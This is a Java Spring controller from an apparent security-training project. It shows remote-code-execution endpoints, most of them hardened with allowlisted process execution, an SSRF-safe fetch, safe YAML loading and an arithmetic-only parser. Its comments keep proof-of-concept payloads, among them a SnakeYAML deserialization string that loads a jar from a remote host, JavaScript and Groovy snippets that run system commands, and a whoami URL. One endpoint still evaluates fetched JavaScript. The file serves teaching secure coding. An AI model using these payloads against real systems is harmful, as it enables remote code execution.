package org.joychou.controller;

import lombok.extern.slf4j.Slf4j;
import org.joychou.security.SecurityUtil;
import org.joychou.security.ssrf.SSRFException;
import org.joychou.security.ssrf.SafeUrl;
import org.joychou.util.LogSanitizer;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.sql.DriverManager;
import java.util.regex.Pattern;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    private static final int MAX_SCRIPT_BYTES = 256 * 1024;
    private static final Pattern SAFE_GROOVY_EXPR = Pattern.compile("^[0-9+\\-*/%(). ]{1,100}$");

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        StringBuilder sb = new StringBuilder();

        String[] argv = SecurityUtil.cmdArgv(cmd);
        if (argv == null) {
            return "Bad boy. I got u.";
        }

        try {
            // argv exec, no shell; executable allowlisted and arguments validated
            Process p = new ProcessBuilder(argv).redirectErrorStream(true).start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            log.error("Command exec failed: {}", LogSanitizer.clean(e));
            return "Request failed.";
        }
        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping(value = "/ProcessBuilder", produces = MediaType.TEXT_PLAIN_VALUE)
    public ResponseEntity<String> processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        String[] arrCmd = SecurityUtil.cmdArgv(cmd);
        if (arrCmd == null) {
            return plainText("Bad boy. I got u.");
        }

        try {
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            log.error("ProcessBuilder exec failed: {}", LogSanitizer.clean(e));
            return plainText("Request failed.");
        }

        return plainText(HtmlUtils.htmlEscape(sb.toString()));
    }


    private static ResponseEntity<String> plainText(String body) {
        return ResponseEntity.ok()
                .contentType(MediaType.parseMediaType("text/plain;charset=UTF-8"))
                .header("X-Content-Type-Options", "nosniff")
                .body(body);
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // Only scripts hosted on allowlisted domains may be loaded.
        if (SecurityUtil.checkURL(jsurl) == null) {
            throw new IllegalArgumentException("Illegal jsurl");
        }
        // The script is fetched through the SSRF-safe client (http/https only, public addresses only,
        // connection pinned to the validated address, no redirects) and evaluated from memory;
        // the url is never handed to the script engine's own loader.
        String script;
        try (java.io.InputStream in = SafeUrl.parse(jsurl).open()) {
            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int n;
            while ((n = in.read(buf)) > 0) {
                out.write(buf, 0, n);
                if (out.size() > MAX_SCRIPT_BYTES) {
                    throw new IllegalArgumentException("jsurl script too large");
                }
            }
            script = new String(out.toByteArray(), java.nio.charset.StandardCharsets.UTF_8);
        } catch (SSRFException e) {
            throw new IllegalArgumentException("Illegal jsurl");
        }
        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        engine.eval(script);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        // SafeConstructor only builds standard YAML types; arbitrary class instantiation is rejected.
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public void groovyshell(String content) {
        // Only plain arithmetic expressions are evaluated; no identifiers, method calls or strings.
        if (content == null || !SAFE_GROOVY_EXPR.matcher(content).matches()) {
            throw new IllegalArgumentException("Illegal expression");
        }
        // Request content is never compiled as Groovy source: it is evaluated by a small
        // arithmetic-only parser that has no way to call methods or touch the runtime.
        new ArithmeticParser(content).parse();
    }

    /**
     * Minimal recursive-descent evaluator for + - * / % and parentheses over decimal numbers.
     */
    private static final class ArithmeticParser {
        private final String src;
        private int pos;

        ArithmeticParser(String src) {
            this.src = src;
        }

        double parse() {
            double v = expr();
            skipSpaces();
            if (pos != src.length()) {
                throw new IllegalArgumentException("Illegal expression");
            }
            return v;
        }

        private void skipSpaces() {
            while (pos < src.length() && src.charAt(pos) == ' ') {
                pos++;
            }
        }

        private boolean eat(char c) {
            skipSpaces();
            if (pos < src.length() && src.charAt(pos) == c) {
                pos++;
                return true;
            }
            return false;
        }

        private double expr() {
            double v = term();
            while (true) {
                if (eat('+')) {
                    v += term();
                } else if (eat('-')) {
                    v -= term();
                } else {
                    return v;
                }
            }
        }

        private double term() {
            double v = factor();
            while (true) {
                if (eat('*')) {
                    v *= factor();
                } else if (eat('/')) {
                    v /= factor();
                } else if (eat('%')) {
                    v %= factor();
                } else {
                    return v;
                }
            }
        }

        private double factor() {
            if (eat('-')) {
                return -factor();
            }
            if (eat('+')) {
                return factor();
            }
            if (eat('(')) {
                double v = expr();
                if (!eat(')')) {
                    throw new IllegalArgumentException("Illegal expression");
                }
                return v;
            }
            skipSpaces();
            int start = pos;
            while (pos < src.length() && (Character.isDigit(src.charAt(pos)) || src.charAt(pos) == '.')) {
                pos++;
            }
            if (start == pos) {
                throw new IllegalArgumentException("Illegal expression");
            }
            try {
                return Double.parseDouble(src.substring(start, pos));
            } catch (NumberFormatException e) {
                throw new IllegalArgumentException("Illegal expression");
            }
        }
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

